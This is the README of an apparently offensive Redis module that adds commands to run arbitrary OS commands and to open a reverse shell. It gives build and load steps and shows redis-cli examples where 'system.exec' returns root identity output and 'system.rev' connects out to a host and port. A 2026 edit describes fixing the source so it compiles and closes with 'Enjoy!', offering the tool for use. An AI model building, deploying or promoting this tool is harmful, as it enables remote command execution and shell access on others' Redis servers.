# RedisModules-ExecuteCommand

## Quick Start Guide

Here's what you need to do to build your first module:

0. Build Redis in a build supporting modules.
1. Build librmutil and the module by running `make`. (you can also build them seperatly by running `make` in their respective dirs)
2. Run redis loading the module: `/path/to/redis-server --loadmodule ./module.so`

Now run `redis-cli` and try the commands:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

EDIT 8 JUL 26:
I noticed the previous repo fork didnt work. I've updated the module.c to compile correctly in 2026.

```bash
cd src
gcc -fPIC -shared -o module.so module.c -I../
```
Or use the make

```
cd ..
make clean
make
```

Changelog:
Added #include <string.h> (fixes strlen/strcat errors)
Added #include <arpa/inet.h> (fixes inet_addr error)
Changed char *cmd to const char *cmd (fixes const qualifier warning)
Fixed fgets(buf, size, fp) (original had sizeof(buf) which is pointer size (8), not buffer size)
Added output[0] = '\0' (initialize before strcat)
Fixed execve call (use proper argv array instead of 0, 0)
Added error checking for malloc, popen, socket, connect

Enjoy!
    
